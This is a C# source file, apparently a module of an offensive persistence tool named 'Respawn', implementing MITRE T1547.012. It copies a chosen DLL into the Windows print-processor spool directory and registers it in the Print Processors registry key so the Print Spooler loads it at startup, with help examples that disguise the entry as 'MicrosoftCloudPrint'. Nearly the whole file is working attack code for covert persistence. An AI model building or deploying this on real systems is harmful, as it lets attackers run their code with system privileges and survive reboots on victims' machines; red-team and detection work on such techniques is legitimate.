using Respawn.Core;
using System.Runtime.InteropServices;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.PrintProcessor
{
    public class PrintProcessorModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "print";
        public string Name        => "Print Processors";
        public string Mitre       => "T1547.012";
        public string Description => "Persist by abusing the Windows Print Spooler service, registering a malicious DLL as a custom Print Processor in the system registry so that it is automatically loaded into spoolsv.exe during system startup.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath  = @"SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors";
        const string SpoolDir = @"C:\Windows\System32\spool\prtprocs\x64";

        // ─── P/Invoke for Reboot Deletion ────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool MoveFileEx(string lpExistingFileName, string? lpNewFileName, uint dwFlags);

        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x04;

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // // 2. TECHNICAL REQUIREMENTS
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  TECHNICAL REQUIREMENTS:");
            // Console.ResetColor();
            // Console.WriteLine("    - DLL MUST export the 'OpenPrintProcessor' function");
            // // Console.WriteLine("    - DLL must reside in System32\\spool\\prtprocs\\x64");
            // Console.WriteLine("    - Requires REBOOT to load into spoolsv.exe");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Display name for the processor (e.g. 'GenPrint')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target DLL (.dll only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t print -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t print -a install -n \"MicrosoftCloudPrint\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t print -a verify  -n \"MicrosoftCloudPrint\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t print -a remove  -n \"MicrosoftCloudPrint\"");
        }

        // ... (ListOptions and Install remain unchanged) ...

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return PrintProcessorKeys.All;

            return new List<TechniqueOption>();
        }

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Print Processors registry key. Run as administrator.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing != null)
                    return TechniqueResult.Exists($"Print processor '{ctx.Name}' already registered.");

                string dllName    = Path.GetFileName(ctx.Payload);
                string targetPath = Path.Combine(SpoolDir, dllName);

                if (!Directory.Exists(SpoolDir))
                    Directory.CreateDirectory(SpoolDir);

                if (!System.IO.File.Exists(targetPath))
                    System.IO.File.Copy(ctx.Payload, targetPath, overwrite: false);

                using var processorKey = baseKey.CreateSubKey(ctx.Name, writable: true);
                if (processorKey == null)
                    return TechniqueResult.Fail($"Failed to create processor subkey '{ctx.Name}'.");

                processorKey.SetValue("Driver", dllName);

                return TechniqueResult.Ok(
                    $"Installed print processor '{ctx.Name}' | " +
                    $"DLL copied to: '{targetPath}' | " +
                    $"Reboot required to load into spoolsv.exe.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Print processor registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove (Updated Deletion Logic) ─────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Print Processors registry key. Run as administrator.");

                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing == null)
                    return TechniqueResult.NotFound($"Print processor '{ctx.Name}' not found.");

                // Get DLL name before deleting the key
                string? dllName = existing.GetValue("Driver")?.ToString();
                
                // 1. Delete Registry Entry
                baseKey.DeleteSubKeyTree(ctx.Name);

                // 2. Handle File Deletion
                if (!string.IsNullOrEmpty(dllName))
                {
                    string targetPath = Path.Combine(SpoolDir, dllName);
                    if (System.IO.File.Exists(targetPath))
                    {
                        // try
                        // {
                        //     // Try immediate delete first
                        //     System.IO.File.Delete(targetPath);
                        // }
                        // catch (IOException)
                        // {
                            // File is locked (normal for Print Processors). 
                            // Mark for deletion on next reboot.
                            bool scheduled = MoveFileEx(targetPath, null, MOVEFILE_DELAY_UNTIL_REBOOT);
                            
                            if (scheduled)
                                return TechniqueResult.Ok($"Removed registry for '{ctx.Name}'. DLL is locked but scheduled for deletion on reboot.");
                            else
                                return TechniqueResult.Fail($"Registry removed, but failed to schedule DLL deletion. Error: {Marshal.GetLastWin32Error()}");
                        // }
                    }
                }

                return TechniqueResult.Ok($"Removed print processor '{ctx.Name}' and deleted DLL.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ... (Verify and Validate remain unchanged) ...

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Print Processors registry key. Run as administrator.");

                using var processorKey = baseKey.OpenSubKey(ctx.Name);
                if (processorKey == null)
                    return TechniqueResult.NotFound($"Print processor '{ctx.Name}' not found.");

                string? dllName   = processorKey.GetValue("Driver")?.ToString();
                string  dllPath   = Path.Combine(SpoolDir, dllName ?? "");
                bool    dllExists = System.IO.File.Exists(dllPath);

                return TechniqueResult.Ok(
                    $"Verified print processor '{ctx.Name}' | " +
                    $"Driver: '{dllName}' | " +
                    $"DLL in spool directory: {dllExists}");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No processor name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "Print processor requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}